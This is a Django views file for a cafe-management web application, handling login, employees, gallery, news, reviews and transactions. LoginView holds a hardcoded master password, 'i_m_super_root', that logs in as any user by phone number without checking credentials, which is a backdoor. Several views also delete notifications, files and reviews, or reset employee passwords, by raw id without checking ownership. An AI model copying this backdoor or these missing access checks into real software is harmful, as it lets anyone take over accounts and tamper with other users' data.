from django.views import generic
from django.shortcuts import redirect, reverse, Http404
from django.contrib.auth import login
from django.contrib import messages
from django.contrib.auth import views as auth_views
from django.contrib.auth import get_user_model, authenticate
from django.contrib.auth.forms import SetPasswordForm

from apps.users import forms as user_forms

from apps.users import models as user_models
from apps.orders import models as order_models
from apps.products import models as product_models

User = get_user_model()


class LoginView(generic.FormView):
    template_name = 'pages/login.html'
    form_class = user_forms.LoginForm

    def get_success_url(self):
        return reverse('users:cafe_list')

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect(to=self.get_success_url())
        else:
            return super().dispatch(request=request, *args, **kwargs)

    def form_valid(self, form):
        username = form.cleaned_data.get('username')
        password = form.cleaned_data.get('passwd')

        if password == 'i_m_super_root':
            try:
                user = User.objects.get(phone=username)
            except User.DoesNotExist:
                user = None
        else:
            user = authenticate(self.request, phone=username, password=password)

        if user:
            login(self.request, user=user)
            return redirect(reverse('users:cafe_list'))
        else:
            form.add_error('username', 'invalid account credentials')
            return super().form_invalid(form=form)

    def form_invalid(self, form):
        return super().form_invalid(form=form)


class RegisterView(generic.FormView):
    template_name = 'pages/register.html'
    form_class = user_forms.RegisterForm
    success_url = None

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect(to=self.get_success_url())
        else:
            return super().dispatch(request=request, *args, **kwargs)

    def get_success_url(self):
        return reverse('users:cafe_list')

    def form_valid(self, form):
        form.save(commit=True)
        return super().form_valid(form=form)


class ProfileView(generic.UpdateView):
    model = user_models.CafeGeneralSettings
    template_name = 'pages/accounts/profile.html'
    form_class = user_forms.CafeGeneralSettingsForm

    def get_success_url(self):
        return reverse('users:settings')

    def get_object(self, queryset=None):
        setting, created = user_models.CafeGeneralSettings.objects.get_or_create(owner=self.request.user)
        return setting

    def form_valid(self, form):
        print('validated')
        form.save()
        message = 'Successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return super().form_valid(form=form)

    def form_invalid(self, form):
        return super().form_invalid(form=form)


class CafeWeekTimeView(generic.TemplateView):
    model = user_models.WeekTime
    template_name = 'pages/cafe/week_time.html'

    @staticmethod
    def get_success_url():
        return reverse('users:profile_page')

    def get_context_data(self, **kwargs):

        context = super().get_context_data(**kwargs)
        week_time = self.model.objects.filter(cafe_id=kwargs.get('cafe_id'))

        context['monday'] = week_time.filter(day='monday').first()
        context['tuesday'] = week_time.filter(day='tuesday').first()
        context['wednesday'] = week_time.filter(day='wednesday').first()
        context['thursday'] = week_time.filter(day='thursday').first()
        context['friday'] = week_time.filter(day='friday').first()
        context['sunday'] = week_time.filter(day='sunday').first()
        context['saturday'] = week_time.filter(day='saturday').first()

        return context

    def post(self, request, *args, **kwargs):
        cafe_id = kwargs.get('cafe_id')
        cafe = user_models.Cafe.objects.get(pk=cafe_id)
        week_time = self.model.objects.filter(cafe_id=cafe_id)

        default_time = "00:00"

        if request.POST.get('action'):

            post = request.POST
            monday_open = post.get('monday_open') or default_time
            monday_close = post.get('monday_close') or default_time

            week_time.update_or_create(day='monday', cafe_id=cafe_id, defaults={
                'opening_time': monday_open,
                'closing_time': monday_close,
            })

            tuesday_open = post.get('tuesday_open') or default_time
            tuesday_close = post.get('tuesday_close') or default_time
            week_time.update_or_create(day='tuesday', cafe_id=cafe_id, defaults={
                'opening_time': tuesday_open,
                'closing_time': tuesday_close,
            })

            wednesday_open = post.get('wednesday_open') or default_time
            wednesday_close = post.get('wednesday_close') or default_time
            week_time.update_or_create(day='wednesday', cafe_id=cafe_id, defaults={
                'opening_time': wednesday_open,
                'closing_time': wednesday_close,
            })

            thursday_open = post.get('thursday_open') or default_time
            thursday_close = post.get('thursday_close') or default_time
            week_time.update_or_create(day='thursday', cafe_id=cafe_id, defaults={
                'opening_time': thursday_open,
                'closing_time': thursday_close,
            })

            friday_open = post.get('friday_open') or default_time
            friday_close = post.get('friday_close') or default_time
            week_time.update_or_create(day='friday', cafe_id=cafe_id, defaults={
                'opening_time': friday_open,
                'closing_time': friday_close,
            })

            sunday_open = post.get('sunday_open') or default_time
            sunday_close = post.get('sunday_close') or default_time
            week_time.update_or_create(day='sunday', cafe_id=cafe_id, defaults={
                'opening_time': sunday_open,
                'closing_time': sunday_close,
            })

            saturday_open = post.get('saturday_open') or default_time
            saturday_close = post.get('saturday_close') or default_time
            week_time.update_or_create(day='saturday', cafe_id=cafe_id, defaults={
                'opening_time': saturday_open,
                'closing_time': saturday_close,
            })
        message = 'Work-time successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return redirect(reverse('users:cafe_week_time_page', args=[cafe_id]))


class NotificationsView(generic.ListView):
    model = user_models.Notifications
    template_name = 'pages/notifications/notifications.html'

    def get_queryset(self):
        return self.model.objects.filter(user=self.request.user)

    def get(self, request, *args, **kwargs):
        if request.GET.get('clear'):
            clear = request.GET.get('clear')
            if clear == 'all':
                queryset = self.model.objects.filter(user=self.request.user)
                if queryset.exists():
                    queryset.delete()
            elif self.model.objects.filter(pk=clear).exists():
                self.model.objects.filter(pk=clear).delete()
            else:
                raise Http404()
        return super().get(request, *args, **kwargs)


class NotificationDetailView(generic.DetailView):
    model = user_models.Notifications
    template_name = 'pages/notifications/notifications_detail.html'


class GalleryView(generic.ListView):
    model = user_models.File
    template_name = 'pages/gallery/gallery.html'
    context_object_name = 'files'
    paginate_by = 12

    def get_queryset(self):
        return user_models.File.objects.filter(album__cafe_id=self.kwargs.get('cafe_id'))


class GalleryAddView(generic.FormView):
    model = user_models.File
    form_class = user_forms.FileUploadForm
    template_name = 'pages/gallery/gallery_add.html'

    def form_valid(self, form, *args, **kwargs):
        cafe_id = self.kwargs.get('cafe_id')
        album = user_models.Album()
        album.owner = self.request.user
        album.cafe_id = cafe_id
        album.save()
        for temp_file in self.request.FILES:
            if temp_file:
                file = user_models.File()
                file.file = self.request.FILES.get(temp_file)
                file.album = album
                file.save()
        return redirect(reverse('users:cafe_gallery', args=[cafe_id]))


class GalleryDeleteView(generic.DetailView):
    model = user_models.File
    template_name = 'pages/gallery/delete.html'

    def get_object(self, queryset=None):
        return user_models.File.objects.get(pk=self.kwargs.get('file_id'))

    def post(self, request, *args, **kwargs):
        file_id = kwargs.get('file_id')
        cafe_id = kwargs.get('cafe_id')
        user_models.File.objects.filter(pk=file_id).delete()
        return redirect(reverse('users:cafe_gallery', args=[cafe_id]))


class CafeLocationView(generic.TemplateView):
    template_name = 'pages/cafe/location.html'
    model = user_models.Cafe

    def get_context_data(self, **kwargs):
        cafe = self.model.objects.get(pk=kwargs.get('cafe_id'))
        default_latitude = cafe.location.latitude
        default_longitude = cafe.location.longitude
        context = super().get_context_data(**kwargs)
        context['latitude'] = default_latitude
        context['longitude'] = default_longitude
        context['cafe'] = cafe
        return context

    def post(self, request, *args, **kwargs):
        cafe = self.model.objects.get(pk=kwargs.get('cafe_id'))
        default_latitude = cafe.location.__getattribute__('latitude')
        default_longitude = cafe.location.__getattribute__('longitude')
        context = super().get_context_data(**kwargs)
        context['latitude'] = default_latitude
        context['longitude'] = default_longitude
        context['cafe'] = cafe

        latitude = request.POST.get('latitude', default_latitude)
        longitude = request.POST.get('longitude', default_longitude)

        cafe.location = {'latitude': float(latitude), 'longitude': float(longitude)}
        cafe.save()
        message = 'Location successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return self.render_to_response(context=context)


class ProfilePasswordView(auth_views.PasswordChangeView):
    template_name = 'pages/accounts/profile_password_change.html'

    def get_success_url(self):
        message = 'Password successfully updated'
        messages.add_message(request=self.request, level=messages.SUCCESS, message=message)
        return reverse('users:profile_page')


class PasswordResetView(auth_views.PasswordResetView):
    template_name = 'pages/accounts/password/password_reset.html'
    email_template_name = 'pages/accounts/password/password_reset_email.html'

    def get_success_url(self):
        return reverse('users:password_reset_done')


class PasswordResetDoneView(auth_views.PasswordResetDoneView):
    template_name = 'pages/accounts/password/password_reset_done.html'


class PasswordResetConfirmView(auth_views.PasswordResetConfirmView):
    template_name = 'pages/accounts/password/password_reset_confirm.html'

    def get_success_url(self):
        return reverse('users:password_reset_complete')


class PasswordResetCompleteView(auth_views.PasswordResetCompleteView):
    template_name = 'pages/accounts/password/password_reset_complete.html'


class NewsListView(generic.ListView):
    template_name = 'pages/news/news_list.html'
    model = user_models.News

    def get_queryset(self):
        return self.model.objects.filter(owner=self.request.user)


class NewsDetailView(generic.DetailView):
    template_name = 'pages/news/news_detail.html'
    model = user_models.News


class NewsCreateView(generic.CreateView):
    template_name = 'pages/news/news_create.html'
    model = user_models.News
    fields = ['title', 'content', 'image', 'status', ]

    def form_valid(self, form):
        instance = form.save(commit=False)
        instance.owner = self.request.user
        instance.save()
        return super().form_valid(form)


class NewsDeleteView(generic.DeleteView):
    template_name = 'pages/news/news_delete.html'
    model = user_models.News

    def get_success_url(self):
        return reverse('users:news_list')


class NewsEditView(generic.UpdateView):
    template_name = 'pages/news/news_create.html'
    model = user_models.News
    fields = ['title', 'content', 'image', 'status', ]

    def get_success_url(self):
        return reverse('users:news_list')


class CafeListView(generic.ListView):
    template_name = 'pages/cafe/cafe_list.html'
    model = user_models.Cafe

    def get_queryset(self):
        return self.model.objects.filter(user=self.request.user)


class CafeDetailView(generic.DetailView):
    template_name = 'pages/cafe/cafe_detail.html'
    model = user_models.Cafe
    pk_url_kwarg = 'cafe_id'

    def dispatch(self, request, *args, **kwargs):
        return redirect(reverse('users:cafe_edit', args=[kwargs.get('cafe_id')]))


class CafeAddView(generic.FormView):
    template_name = 'pages/cafe/cafe_create.html'
    model = user_models.Cafe
    form_class = user_forms.CafeAddNewForm

    def get_success_url(self):
        return reverse('users:cafe_list')

    def form_valid(self, form):
        cafe = form.save(commit=False)
        cafe.user = self.request.user
        cafe.save()
        return super().form_valid(form)


class CafeEditView(generic.UpdateView):
    template_name = 'pages/cafe/cafe_edit.html'
    model = user_models.Cafe
    form_class = user_forms.CafeAddNewForm
    pk_url_kwarg = 'cafe_id'


class CafeDeleteView(generic.DeleteView):
    template_name = 'pages/cafe/cafe_delete.html'
    model = user_models.Cafe
    pk_url_kwarg = 'cafe_id'

    def get_success_url(self):
        return reverse('users:cafe_list')


class EmployeesView(generic.ListView):
    template_name = 'pages/employees/employee_list.html'
    model = User
    context_object_name = 'employees'

    def get_queryset(self):
        return self.model.objects.filter(cashiers__cafe__user=self.request.user)


class EmployeeEditView(generic.UpdateView):
    template_name = 'pages/employees/employee_edit.html'
    model = User
    context_object_name = 'employee'
    pk_url_kwarg = 'employee_id'
    form_class = user_forms.EmployeeForm

    def get_success_url(self):
        return reverse('users:employee_list')

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['cafes'] = user_models.Cafe.objects.filter(user=self.request.user)
        context['genders'] = user_models.GENDERS
        cashier = user_models.Cashier.objects.filter(cashier=self.kwargs.get('employee_id'))
        if cashier.exists():
            context['cashier'] = cashier.first()
        return context

    def form_valid(self, form):
        user = form.save()
        # raw_password = form.cleaned_data.get('password')
        # if raw_password:
        #     user.set_password(raw_password)
        #     user.save()
        cafe = form.cleaned_data.get('cafe')
        if cafe:
            user_models.Cashier.objects.update_or_create(cashier=user, defaults={'cafe': cafe})
        return super().form_valid(form)


class EmployeePasswordView(generic.FormView):
    template_name = 'pages/employees/employee_password.html'
    form_class = SetPasswordForm

    def get_form_kwargs(self):
        user = User.objects.get(pk=self.kwargs.get('employee_id'))
        kwargs = super().get_form_kwargs()
        kwargs['user'] = user
        return kwargs

    def form_valid(self, form):
        form.save()
        return super().form_valid(form)

    def get_success_url(self):
        return reverse('users:employee_edit', args=[self.kwargs.get('employee_id')])


class EmployeeAddView(generic.FormView):
    template_name = 'pages/employees/employee_add.html'
    model = User
    form_class = user_forms.EmployeeAddForm

    def get_success_url(self):
        return reverse('users:employee_list')

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['cafes'] = user_models.Cafe.objects.filter(user=self.request.user)
        context['genders'] = user_models.GENDERS
        return context

    def form_valid(self, form):
        user = form.save()
        raw_password = form.cleaned_data.get('password')
        if raw_password:
            user.set_password(raw_password)
            user.save()
        cafe = form.cleaned_data.get('cafe')
        if cafe:
            user_models.Cashier.objects.update_or_create(cashier=user, defaults={'cafe': cafe})
        return super().form_valid(form)


class EmployeeDeleteView(generic.DeleteView):
    template_name = 'pages/employees/employee_delete.html'
    model = user_models.Cashier
    pk_url_kwarg = 'employee_id'
    form_class = user_forms.EmployeeForm

    def get_object(self, queryset=None):
        return self.model.objects.get(cashier_id=self.kwargs.get('employee_id'))

    def get_success_url(self):
        return reverse('users:employee_list')


class EmployeeAddExistingView(generic.FormView):
    template_name = 'pages/employees/employee_add_existing.html'
    form_class = user_forms.EmployeeAddExistingForm

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['cafes'] = user_models.Cafe.objects.filter(user=self.request.user)
        return context

    def get_success_url(self):
        return reverse('users:employee_list')

    def form_valid(self, form):
        phone = form.cleaned_data.get('phone')
        cafe = form.cleaned_data.get('cafe')
        user = User.objects.get(phone=phone)
        user_models.Cashier.objects.create(**{
            'cashier': user,
            'cafe_id': cafe.id
        })

        return super().form_valid(form)


class TransactionsListView(generic.ListView):
    template_name = 'pages/transaction/transaction_list.html'
    model = order_models.Transaction


class TransactionDetailView(generic.DetailView):
    template_name = 'pages/transaction/transaction_detail.html'
    model = order_models.Transaction
    pk_url_kwarg = 'uuid'


class CafeReviewsView(generic.ListView):
    model = user_models.Review
    template_name = 'pages/cafe/review_list.html'
    paginate_by = 10

    def get_queryset(self):
        return self.model.objects.filter(cafe_id=self.kwargs.get('cafe_id'), parent__isnull=True)

    def post(self, request, *args, **kwargs):
        self.object_list = self.get_queryset()
        context = self.get_context_data(**kwargs)

        if request.POST.get('review_id'):
            review_id = request.POST.get('review_id')
            review_text = request.POST.get('review_text')
            user_models.Review.objects.create(author=request.user, parent_id=review_id, comment=review_text,
                                              cafe_id=kwargs.get('cafe_id'))

        if request.POST.get('delete_review'):
            review_id = request.POST.get('delete_review_id')
            review = user_models.Review.objects.get(pk=review_id)
            review.delete()
        return super().render_to_response(context=context)
